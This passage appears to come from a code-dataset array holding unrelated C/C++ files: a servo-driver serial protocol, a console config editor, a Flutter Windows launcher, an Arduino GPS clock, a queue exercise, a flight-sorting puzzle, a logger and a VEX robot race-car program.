txBuffer[2] = getCheckSum(txBuffer,2);\r\n    servoSerial->write(txBuffer,3);\r\n    length = 3;\r\n    ack(length,order);\r\n    return ;\r\n  }\r\n  else if(order == saveOrClearStatus){\r\n    txBuffer[1] = 0xFF;\r\n  }\r\n  else {\r\n    error();\r\n    return ;\r\n  }\r\n  txBuffer[2] = value;\r\n  txBuffer[3] = getCheckSum(txBuffer,3);\r\n  servoSerial->write(txBuffer,4);\r\n  length=3;\r\n  ack(length,order);\r\n}\r\n\r\nvoid MKSServoDriver::variableControl(uint64_t mode)\r\n{\r\n  txBuffer[1] = 0xFD;\r\n  txBuffer[2] = (mode >> 32) & 0xFF;\r\n  txBuffer[3] = (mode >> 24) & 0xFF;\r\n  txBuffer[4] = (mode >> 16) & 0xFF;\r\n  txBuffer[5] = (mode >> 8) & 0xFF;\r\n  txBuffer[6] = mode & 0xFF;\r\n  txBuffer[7] = getCheckSum(txBuffer,7);\r\n  length = 3;\r\n  servoSerial->write(txBuffer,8);\r\n  command order = varControl;\r\n  ack(length,order);\r\n}\r\n\r\nuint8_t MKSServoDriver::getCheckSum(uint8_t *buffer,uint8_t size)\r\n{\r\n  uint8_t i;\r\n  uint16_t sum=0;\r\n  for(i=0;i<size;i++)\r\n    {\r\n      sum += buffer[i];\r\n    }\r\n  return(sum&0xFF);\r\n}\r\n\r\nvoid MKSServoDriver::ack(uint8_t len , command order)\r\n{\r\n  boo",
    "#include <fstream>\r\n#include \"include/menu.hpp\"\r\n#include \"include/configor/json.hpp\"\r\n#include \"include/path.h\"\r\n#include \"include/inicpp.hpp\"\r\n\r\nusing namespace std;\r\nusing namespace path;\r\nusing namespace configor;\r\nusing namespace inicpp;\r\n\r\nstring self_path, self_name;\r\n\r\nclass Task {\r\npublic:\r\n\tstring path;\r\n\tsize_t trigger_count;\r\n\tclock_t trigger_interval;\r\n\tbool auto_trigger;\r\n\r\n\tinline void init();\r\n\tinline void init(const json::value &task);\r\n\tinline void init(const string &p, const size_t &tc, const clock_t &ti, const bool &at);\r\n\r\n\tTask() { init(); }\r\n\tTask(const json::value &task) { init(task); }\r\n\tTask(const string &p, const size_t &tc, const clock_t &ti, const bool &at) { init(p, tc, ti, at); }\r\n\r\n\tvoid run();\r\n};\r\nclass Config {\r\npublic:\r\n\tclock_t interval_time, interval_eps;\r\n\tvector<Task> task;\r\n\r\n\tinline void init();\r\n\tinline void init(const json::value &config);\r\n\tinline bool init(const string &config_path);\r\n\tinline void init(const clock_t &it, const clock_t &ie, const vector<Task> &t);\r\n\r\n\tConfig() { init(); }\r\n\tConfig(const json::value &config) { init(config); }\r\n\tConfig(const string config_path) { init(config_path); }\r\n\tConfig(const clock_t &it, const clock_t &ie, const vector<Task> &t) { init(it, ie, t); }\r\n\r\n\tjson::value toJson();\r\n};\r\n\r\ninline bool loadConfig(string path, json::value &data) {\r\n\tdata.clear();\r\n\tifstream file(path.c_str());\r\n\tif (!file.is_open()) return true;\r\n\ttry {\r\n\t\tfile >> json::wrap(data);\r\n\t} catch (exception &_ERROR_) { return true; }\r\n\tfile.close();\r\n\treturn false;\r\n}\r\ninline bool editConfig(string path, json::value data) {\r\n\tofstream file(path.c_str());\r\n\tif (!file.is_open()) return true;\r\n\ttry {\r\n\t\tfile << json::wrap(data);\r\n\t} catch (exception &_ERROR_) { return true; }\r\n\tfile.close();\r\n\treturn false;\r\n}\r\n\r\ninline void Task::init() {\r\n\tpath = \"\";\r\n\ttrigger_count = 1;\r\n\ttrigger_interval = 0;\r\n\tauto_trigger = true;\r\n}\r\ninline void Task::init(const json::value &task) {\r\n\tinit();\r\n\tpath = task[\"path\"];\r\n\tpathDelete(path);\r\n\tif (task.count(\"trigger_count\") > 0)\r\n\t\ttrigger_count = stol(task[\"trigger_count\"]);\r\n\tif (task.count(\"trigger_interval\") > 0)\r\n\t\ttrigger_interval = stol(task[\"trigger_interval\"]);\r\n\tif (task.count(\"auto_trigger\") > 0)\r\n\t\tauto_trigger = task[\"auto_trigger\"];\r\n}\r\ninline void Task::init(const string &p, const size_t &tc, const clock_t &ti, const bool &at) {\r\n\tinit();\r\n\tpath = p;\r\n\ttrigger_count = tc;\r\n\ttrigger_interval = ti;\r\n\tauto_trigger = at;\r\n}\r\n\r\ninline void Config::init() {\r\n\tinterval_time = 100;\r\n\tinterval_eps = 1000;\r\n\ttask.clear();\r\n}\r\ninline void Config::init(const json::value &config) {\r\n\tinit();\r\n\tinterval_time = stol(config[\"interval_time\"]);\r\n\tif (config.count(\"interval_eps\"))\r\n\t\tinterval_eps = stol(config[\"interval_eps\"]);\r\n\tif (config.count(\"task\") > 0) {\r\n\t\tfor (json::value subtask : config[\"task\"])\r\n\t\t\ttask.push_back(subtask);\r\n\t}\r\n}\r\ninline bool Config::init(const string &config_path) {\r\n\tjson::value config;\r\n\tbool is_failed = loadConfig(config_path, config);\r\n\tif (is_failed) return true;\r\n\r\n\tinit(config);\r\n\r\n\treturn false;\r\n}\r\ninline void Config::init(const clock_t &it, const clock_t &ie, const vector<Task> &t) {\r\n\tinit();\r\n\tinterval_time = it;\r\n\tinterval_eps = ie;\r\n\ttask = t;\r\n}\r\n\r\njson::value Config::toJson() {\r\n\tjson::value ret;\r\n\tret[\"interval_time\"] = to_string(interval_time);\r\n\tret[\"interval_eps\"] = to_string(interval_eps);\r\n\tfor (Task subtask : task) {\r\n\t\tret[\"task\"].push_back(json::object( {\r\n\t\t\t{\"path\", subtask.path},\r\n\t\t\t{\"trigger_count\", to_string(subtask.trigger_count)},\r\n\t\t\t{\"trigger_interval\", to_string(subtask.trigger_interval)},\r\n\t\t\t{\"auto_trigger\", subtask.auto_trigger}\r\n\t\t} ));\r\n\t}\r\n\treturn ret;\r\n}\r\n\r\nvoid paintMenu(Menu &menu, const Task &subtask, const short &delt, const short &i) {\r\n\tmenu.clear();\r\n\tmenu.push(Button({0, (short)(delt + 0)}, \"[-]\", \"4\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({4, (short)(delt + 0)}, \"\u6587\u4ef6\u8def\u5f84\uff1a\" + subtask.path, \"0\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({4, (short)(delt + 1)}, \"\u89e6\u53d1\u6b21\u6570\uff1a\" + to_string(subtask.trigger_count), \"1\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({4, (short)(delt + 2)}, \"\u89e6\u53d1\u95f4\u9694\uff1a\" + to_string(subtask.trigger_interval) + \"ms\", \"2\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({4, (short)(delt + 3)}, \"\u5524\u9192\u89e6\u53d1\uff1a\" + (subtask.auto_trigger ? (string)\"\u5141\u8bb8\" : (string)\"\u7981\u6b62\"), \"3\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n}\r\nvoid paintMenu(Menu &menu, const Config &config, const string &config_path) {\r\n\tmenu.clear();\r\n\r\n\tmenu.push(Button({0, 0}, \"\u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u5668 - \" + config_path, \"title\", ButtonColor(consoleColor.White), true, true));\r\n\tmenu.push(Button({0, 1}, \"\u64a4\u9500\u4e0a\u6b21\u4fee\u6539\", \"back\", ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({0, 2}, \"\u56de\u9000\u81f3\u542f\u52a8\u65f6\", \"backtobeg\", ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({0, 3}, \"\u4fdd\u5b58\u5e76\u9000\u51fa\", \"exit\", But",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"map\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Including the required Arduino libraries\n#include <MD_Parola.h>\n#include <MD_MAX72xx.h>\n#include <SPI.h>\n#include <TinyGPS++.h>       // include TinyGPS++ library\n#include <TimeLib.h>         // include Arduino time library\n#include <SoftwareSerial.h>  // include software serial library\n\n// Uncomment according to your hardware type\n#define HARDWARE_TYPE MD_MAX72XX::FC16_HW\n//#define HARDWARE_TYPE MD_MAX72XX::GENERIC_HW\n\n// Defining size, and output pins\n#define MAX_DEVICES 8\n#define CS_PIN 9\n\nTinyGPSPlus gps;\n\n#define S_RX 3  // define software serial RX pin (No TX used)\n\nSoftwareSerial SoftSerial(S_RX, -1);  // configure SoftSerial library\n\n// Create a new instance of the MD_Parola class with hardware SPI connection\nMD_Parola myDisplay = MD_Parola(HARDWARE_TYPE, CS_PIN, MAX_DEVICES);\n\n#define time_offset -14400  // define a clock offset in seconds Note: (1 hour) ==> UTC + 1 (but in seconds)\n\n// variable definitions\nchar Time[] = \"TIME: 00:00:00\";\nchar Date[] = \"DATE: 00-00-2000\";\nbyte last_second, Second, Minute, Hour, Day, Month;\nint Year;\n\n// variable defaults\nbool timeIsSet = false;\n\nint h, m, s;\n\nint mill = 0;\n\nint timeout = 0;\nint lastMillis = 0;\nint lastCheck = 0;\n\nunsigned long currentMillis = 0;\n\nvolatile bool pulse = false;\n\n\nvoid setup() {\n  //Strictly utilized for debugging purposes.\n  Serial.begin(115200);\n\n  // Set the intensity (brightness) of the display (0-15)\n  myDisplay.begin();\n  myDisplay.setIntensity(0);\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_LEFT);\n\n  cli();  // Disable interrupts\n    // Set Timer2 to interrupt every 1 ms\n  TCCR2A = 0;  // Set entire TCCR2A register to 0\n  TCCR2B = 0;  // Same for TCCR2B\n  TCNT2 = 0;   // Initialize counter value to 0\n  // Set compare match register to desired timer count.\n  OCR2A = 249;  // 16MHz / 64 (prescaler) / 250 = 1000 Hz\n  // Enable CTC mode\n  TCCR2A |= (1 << WGM21);\n  // Set prescaler to 64 and start the timer\n  TCCR2B |= (1 << CS22);\n  // Enable timer compare interrupt\n  TIMSK2 |= (1 << OCIE2A);\n\n  // Enable global interrupts\n  sei();  // Enable interrupts\n\n  attachInterrupt(digitalPinToInterrupt(2), PPS, RISING);  // Attach interrupt to pin 2, triggering on rising edge\n}\n\n// Triggered every 1ms, using timer2 interrupts for accurate (enough) timing of the milliseconds.\nISR(TIMER2_COMPA_vect) {\n  if (timeIsSet) {\n    mill++;  //increment by 1;\n  }\n}\n\nvoid loop() {\n  if (timeIsSet == false) {  //Determine whether the GPS is needed to set the initial time.\n    timeIsSet = true;\n\n    Serial.print(\"Time is being set...\");\n\n    SoftSerial.begin(9600);  // initialize software serial at 9600 baud\n\n    getTime();\n\n    SoftSerial.end();  // End it so that it does not interfere later...\n\n    Serial.println(\"done!\");\n\n    myDisplay.setTextAlignment(PA_LEFT);\n\n    h = String(hour()).toInt();\n    m = String(minute()).toInt();\n    s = String(second()).toInt();\n\n    mill = 0;\n    timeout = 0;\n  }\n\n  if (pulse) {\n    pulse = false;\n    timeout = 0;\n    mill = 0;\n\n    s++;\n  }\n\n\n  /*if (timeout >= 5000) {\n    timeout = 0;\n    timeIsSet = false;\n    Serial.println(\"Timed out, acquiring new time from GPS...\");\n  }*/\n\n\n  ////////////////// WORK WITH TIME ///////////////////\n\n  if (s > 59) {\n    s = 0;\n    m++;\n    mill = 0;\n  }\n  if (m > 59) {\n    m = 0;\n    h++;\n    mill = 0;\n  }\n  if (h > 23) {\n    h = 0;\n    m = 0;\n    s = 0;\n    mill = 0;\n  }\n\n  printTime(String(h).toInt(), String(m).toInt(), String(s).toInt(), String(mill).toInt());\n}\n\nvoid printTime(int hr, int mn, int sc, int ms) {\n  String hour_str = String(hr);\n  String minute_str = String(mn);\n  String second_str = String(sc);\n  String millisecond_str = String(ms);\n\n  // Format the data to fit on the display better, and increase readability;\n\n  if (hr < 10) {\n    hour_str = \"0\" + hour_str;\n  }\n\n  if (mn < 10) {\n    minute_str = \"0\" + minute_str;\n  }\n\n  if (sc < 10) {\n    second_str = \"0\" + second_str;\n  }\n\n  if (ms < 10) {\n    millisecond_str = \"0\" + millisecond_str;\n  } else if (ms < 100) {\n    millisecond_str = \"00\" + millisecond_str;\n  }\n\n  String data = hour_str + \":\" + minute_str + \":\" + second_str + \":\" + millisecond_str;\n\n  myDisplay.print(data);  // Update the display with the relevant information.\n}\n\nvoid getTime() {\n  bool completed = false;\n\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_CENTER);\n  myDisplay.print(\"Finding Sats.\");\n\n  while (!completed) {\n    while (SoftSerial.available() > 0) {\n      if (gps.encode(SoftSerial.read())) {\n\n        // get time from GPS module\n        if (gps.time.isValid()) {\n          Minute = gps.time.minute();\n          Second = gps.time.second();\n          Hour = gps.time.hour();\n        }\n\n        // set currentMillis UTC time\n        setTime(Hour, Minute, Second, Day, Month, Year);\n\n        // add the offset to get local time\n        adjustTime(time_offset);\n\n        // update time array\n        Time[12] = second() / 10 + '0';\n        Time[13] = second() % 10 + '0';\n        Time[9] = minute() / 10 + '0';\n        Time",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\nnode* current = NULL;\nnode* Front = NULL;\nnode* Rear = NULL;\n\nvoid enqueue(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (Rear != NULL)\n\t{\n\t\tRear->next = current;\n\t\tRear = current;\n\t}\n\telse\n\t{\n\t\tFront = current;\n\t\tRear = current;\n\t}\n\tRear->next = NULL;\n}\nvoid dequeue()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\telse { cout << \"No element Found to be dequeued\" << endl; }\n}\nvoid dequeueAll()\n{\n\twhile (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\tRear = Front = NULL;\n}\nvoid display()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse { cout << \"There is no data in the queue\\n\"; }\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\te -> enqueue node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, c, e, ao, s;\n\tcout << \"--- Welcome to queue implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Enqueue -> (1)\\n\";\n\t\tcout << \"Dequeue an Elements -> (2) \\n\";\n\t\tcout << \"Dequeue All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to enqueue\\n\";\n\t\t\tcin >> e;\n\t\t\tenqueue(e);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to dequeue one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdequeue();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing first node :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to dequeue all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdequeueAll();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing all nodes :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"Enqueue Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "/*\n427\u3001\u673a\u573a\u822a\u73ed\u8c03\u5ea6\n\u9898\u76ee\u63cf\u8ff0\uff1a\nXX\u5e02\u673a\u573a\u505c\u653e\u4e86\u591a\u67b6\u98de\u673a\uff0c\u6bcf\u67b6\u98de\u673a\u90fd\u6709\u81ea\u5df1\u7684\u822a\u73ed\u53f7CA3385\uff0cCZ6678\uff0cSC6508\u7b49\uff0c\u822a\u73ed\u53f7\u7684\u524d2\u4e2a\u5927\u5199\u5b57\u6bcd(\u6216\u6570\u5b57\uff09\u4ee3\u8868\u822a\u7a7a\u516c\u53f8\u7684\u7f29\u5199\uff0c\u540e\u97624\u4e2a\u6570\u5b57\u4ee3\u8868\u822a\u73ed\u4fe1\u606f\u3002\u4f46\u662fXX\u5e02\u673a\u573a\u53ea\u6709\u4e00\u6761\u8d77\u98de\u7528\u8dd1\u9053\uff0c\u8c03\u5ea6\u4eba\u5458\u9700\u8981\u5b89\u6392\u76ee\u524d\u505c\u7559\u5728\u673a\u573a\u7684\u822a\u73ed\u6709\u5e8f\u8d77\u98de\u3002\u4e3a\u4fdd\u969c\u822a\u73ed\u7684\u6709\u5e8f\u8d77\u98de\uff0c\u8c03\u5ea6\u5458\u9996\u5148\u6309\u7167\u822a\u7a7a\u516c\u53f8\u7684\u7f29\u5199\uff08\u822a\u73ed\u53f7\u524d2\u4e2a\u5b57\u6bcd\uff09\u5bf9\u6240\u6709\u822a\u73ed\u8fdb\u884c\u6392\u5e8f\uff0c\u540c\u4e00\u822a\u7a7a\u516c\u53f8\u7684\u822a\u73ed\u518d\u6309\u7167\u822a\u73ed\u53f7\u7684\u540e4\u4e2a\u6570\u5b57\u8fdb\u884c\u6392\u5e8f\u6700\u7ec8\u83b7\u5f97\u5b89\u6392\u597d\u7684\u822a\u73ed\u7684\u8d77\u98de\u987a\u5e8f\u3002\u8bf7\u7f16\u5199\u4e00\u6bb5\u4ee3\u7801\u6839\u636e\u8f93\u5165\u7684\u822a\u73ed\u53f7\u4fe1\u606f\u5e2e\u52a9\u8c03\u5ea6\u5458\u8f93\u51fa\u822a\u73ed\u7684\u8d77\u98de\u987a\u5e8f\u3002\n\n\u8bf4\u660e\uff1a\n1\u3001\u822a\u7a7a\u516c\u53f8\u7f29\u5199\u6392\u5e8f\u6309\u7167\u4ece\u7279\u6b8a\u7b26\u53f7$ & *, 0~9\uff0cA~Z\u6392\u5e8f\uff1b\n\n\u8f93\u5165\u63cf\u8ff0\uff1a\u7b2c\u4e00\u884c\u8f93\u5165\u822a\u73ed\u4fe1\u606f\uff0c\u591a\u4e2a\u822a\u73ed\u53f7\u4e4b\u95f4\u7528\u9017\u53f7\uff08\u201c\uff0c\u201d\uff09\u5206\u9694\uff0c\u8f93\u5165\u7684\u822a\u73ed\u53f7\u4e0d\u8d85\u8fc7100\u4e2a\u4f8b\u5982\uff1a\nCA3385,CZ6678,SC6508,DU7523,HK4456,MK0987\n\u5907\u6ce8\uff1a\u822a\u73ed\u53f7\u4e3a6\u4f4d\u957f\u5ea6\uff0c\u540e4\u4f4d\u4e3a\u7eaf\u6570\u5b57\uff0c\u4e0d\u8003\u8651\u5b58\u5728\u540e4\u4f4d\u91cd\u590d\u7684\u573a\u666f\n\n\u8f93\u51fa\u63cf\u8ff0\uff1a\nCA3385,CZ6678,DU7523,HK4456,MK0987,SC6508\n\n\u793a\u4f8b1\n\u8f93\u5165\uff1a\nCA3385,CZ6678,SC6508,DU7523,HK4456,MK0987\n\u8f93\u51fa\uff1a\nCA3385,CZ6678,DU7523,HK4456,MK0987,SC6508\n\u8bf4\u660e\uff1a\n\u8f93\u5165\u76ee\u524d\u505c\u7559\u5728\u8be5\u673a\u573a\u7684\u822a\u73ed\u53f7\uff0c\u8f93\u51fa\u4e3a\u6309\u7167\u8c03\u5ea6\u6392\u5e8f\u540e\u8f93\u51fa\u7684\u6709\u5e8f\u7684\u822a\u73ed\u53f7\n\n\u793a\u4f8b2\n\u8f93\u5165\uff1a\nMU1087,CA9908,3U0045,FM1703\n\u8f93\u51fa\uff1a\n3U0045,CA9908,FM1703,MU1087\n\u8bf4\u660e\uff1a\n*/\n#include<iostream>\n#include<vector>\n#include<string>\n#include<sstream>\n#include<algorithm>\n\nusing namespace std;\n\nbool cmp(string &a, string &b)\n{\n\tstring airline1 = a.substr(0, 2);\n\tstring airline2 = b.substr(0, 2);\n\tstring number1 = a.substr(2);\n\tstring number2 = b.substr(2);\n\tif (airline1 != airline2)\n\t{\n\t\treturn airline1 < airline2;\n\t}\n\telse {\n\t\treturn number1 < number2;\n\t}\n}\n\nint main()\n{\n\tstring str;\n\tgetline(cin, str);\n\tvector<string> planes;\n\tstring plane;\n\tistringstream iss(str);\n\twhile (getline(iss, plane, ','))\n\t{\n\t\tplanes.push_back(plane);\n\t}\n\n\tsort(planes.begin(), planes.end(), cmp);\n\n\t// \u8f93\u51fa\n\tfor (int i = 0; i < planes.size(); i++)\n\t{\n\t\tcout << planes[i];\n\t\tif (i != planes.size() - 1)\n\t\t{\n\t\t\tcout << ',';\n\t\t}\n\t}\n\n}",
    "#include \"Logger.h\"\n\n\nstd::string GetFileName(const std::string& path) {\n\t// Encontra a \u00faltima ocorr\u00eancia do caractere de barra invertida\n\tsize_t pos = path.find_last_of(\"\\\\\");\n\tif (pos != std::string::npos) {\n\t\t// Retorna a parte da string a partir dessa posi\u00e7\u00e3o\n\t\treturn path.substr(pos);\n\t}\n\telse {\n\t\t// Se n\u00e3o houver nenhuma ocorr\u00eancia, retorna o caminho completo\n\t\treturn path;\n\t}\n}\n\nstd::string CurrentDataTimeToString() {\n\tstd::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());\n\tstd::string output(30, '\\0');\n\tstruct tm timeinfo;\n\tif (localtime_s(&timeinfo, &now) == 0) {\n\t\tstd::strftime(&output[0], output.size(), \"%d/%b/%Y %H:%M:%S\", &timeinfo);\n\t}\n\treturn output;\n}\n\nvoid Logger::Info(const std::string& message, const char* file, int line) {\n\n\tstd::cout << CurrentDataTimeToString();\n\tstd::cout << ANSI_COLOR_GREEN << \" INFO \" << ANSI_COLOR_RESET;\n\tstd::cout << ANSI_COLOR_GREY << GetFileName(file) << \":\" << line << \": \" << ANSI_COLOR_RESET;\n\tstd::cout << message << std::endl;\n}\n\nvoid Logger::Warning(const std::string& message, const char* file, int line) {\n\tstd::cout << CurrentDataTimeToString();\n\tstd::cout << ANSI_COLOR_YELLOW << \" WARN \" << ANSI_COLOR_RESET;\n\tstd::cout << ANSI_COLOR_GREY << GetFileName(file) << \":\" << line << \": \" << ANSI_COLOR_RESET;\n\tstd::cout << message << std::endl;\n}\n\nvoid Logger::Error(const std::string& message, const char* file, int line) {\n\tstd::cout << CurrentDataTimeToString();\n\tstd::cout << ANSI_COLOR_RED << \" ERRO \" << ANSI_COLOR_RESET;\n\tstd::cout << ANSI_COLOR_GREY << GetFileName(file) << \":\" << line << \": \" << ANSI_COLOR_RESET;\n\tstd::cout << message << std::endl;\n}",
    "\n#pragma region VEXcode Generated Robot Configuration\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <math.h>\n#include <string.h>\n\n#include \"vex.h\"\n\nusing namespace vex;\n\nbrain Brain;\n\n// robot devices onfiguration\nmotor backLeft = motor(PORT1, ratio36_1, false);\nmotor backRight = motor(PORT2, ratio36_1, true);\n\ninertial mpu = inertial(PORT6);\n\ndistance distanceLeft = distance(PORT11);\ndistance distanceRight = distance(PORT12);\ndistance distanceFront = distance(PORT13);\n\noptical colorLeft = optical(PORT16);\noptical colorRight = optical(PORT17);\n\ncontroller Controller1 = controller(primary);\n\nbool RemoteControlCodeEnabled = true;\n\n#pragma endregion VEXcode Generated Robot Configuration\n\n/*----------------------------------------------------------*/\n/*                                                          */\n/*    Module:       main.cpp                                */\n/*    Author:       Jining Liu                              */\n/*    Created:      04/26/2024                              */\n/*    Description:  Autonomous Race Car for POE             */\n/*                                                          */\n/*----------------------------------------------------------*/\n\n#include \"vex.h\"\n\nusing namespace vex;\n\n// decides which distance sensor to use\nbool useRightSensor = true;\n\n// decides distance between car and wall in mm, this is a range\nconst int minDistanceFromWall = 250, maxDistanceFromWall = 350;\n\n// decides the intensity of system keep straight adjustments\nconst double leftPidMultiplier = 1, rightPidMultiplier = 2;\n\n// decides initial speed of back motors\nconst int initLeftMotor = 34, initRightMotor = 50;\nconst int leftMotorMin = 31, rightMotorMin = 44;\nconst int leftMotorMax = 37, rightMotorMax = 56;\nint leftMotor = initLeftMotor, rightMotor = initRightMotor;\n\n// DO NOT CHANGE: stores distance sensor data, default 0\nint lastLeft, currentLeft, lastRight, currentRight, currentFront;\n\n// DO NOT CHANGE: stopwatch for race timing in ms, default 0\nint raceTime;\n\n// required to predefine functions??? vex version of cpp is dumb... declarations down below\nvoid updateDistance();\nvoid pidDistanceStraight();\nvoid executeTurn(int i, int delay);\nvoid finalLeg();\nvoid abort();\nvoid pauseResume();\nvoid stop();\nvoid debugPrint();\nvoid preparePrintBig(int y, int x, bool clear);\n\n// auton turns programming\n// timing is automatic\n//\n// make sure numberOfTurns is the same as the length of carTurns & preTurnDelay!\n// memory allocation is required!!!\n//\n// key:\n// -1 - left turn\n// 0 - keep straight\n// 1 - right turn\nconst int numberOfTurns = 6;\nconst int carTurns[numberOfTurns] = {0, 1, 0, 1, 1, -1};\n// this sets the seconds of delay BEFORE executing the turn or continuing on\nconst int preTurnDelay[numberOfTurns] = {3, 1, 2, 1, 1, 1};\n// this sets the seconds of delay AFTER executing the turn or continuing on\nconst int postTurnDelay[numberOfTurns] = {0, 2, 0, 2, 2, 2};\n\n// stupid vex don't ask\nbool overrideFirst9999 = true;\n\nbool paused = false;\nbool aborted = false;\n\nint main()\n{\n\n  preparePrintBig(2, 1, true);\n  Brain.Screen.print(\"Initializing...\");\n\n  Controller1.ButtonX.pressed(abort);\n  Controller1.ButtonR1.pressed(pauseResume);\n\n  // super inertial sensor calibration\n  for (int i = 0; i < 100; i++)\n  {\n    mpu.calibrate();\n    mpu.setHeading(0, degrees);\n    wait(15, msec);\n  }\n\n  wait(1, seconds);\n\n  preparePrintBig(2, 1, true);\n  Brain.Screen.print(\"Currently:\");\n\n  // record start time\n  raceTime = Brain.Timer.time(msec);\n\n  for (int i = 0; i < numberOfTurns; i++)\n  {\n\n    stop();\n\n    mpu.setHeading(0, degrees);\n\n    preparePrintBig(3, 1, false);\n    Brain.Screen.clearLine(3);\n    Brain.Screen.print(\"Straightaway\");\n    preparePrintBig(3, 14, false);\n    Brain.Screen.print(i + 1);\n    Brain.Screen.clearLine(4);\n\n    // if car is detecting wall where it's supposed to be, always loop pid\n    while ((useRightSensor && !(currentRight >= 9999 && lastRight < 9999)) ||\n           (!useRightSensor && !(currentRight >= 9999 && lastLeft < 9999)))\n    {\n      stop();\n      pidDistanceStraight();\n      wait(100, msec);\n    }\n\n    preparePrintBig(3, 1, false);\n    Brain.Screen.clearLine(3);\n    Brain.Screen.print(\"Intersection\");\n    preparePrintBig(3, 14, false);\n    Brain.Screen.print(i + 1);\n    preparePrintBig(4, 1, false);\n    switch (carTurns[i])\n    {\n    case -1:\n      Brain.Screen.print(\"Left Turn\");\n      break;\n    case 0:\n      Brain.Screen.print(\"Keep Straight\");\n      break;\n    case 1:\n      Brain.Screen.print(\"Right Turn\");\n      break;\n    }\n\n    // keep going delay before turn\n    wait(preTurnDelay[i], seconds);\n\n    executeTurn(carTurns[i], postTurnDelay[i]);\n  }\n\n  preparePrintBig(3, 1, false);\n  Brain.Screen.clearLine(3);\n  Brain.Screen.print(\"Final Leg!\");\n\n  finalLeg();\n}\n\n// predefine for all below, this is so dumb\nvoid setVelocity();\n\n// predefine for pid, this is so dumb\nvoid pidShiftLeft();\nvoid pidShiftRight();\n\n// pid for back motors keeping straight and correc",
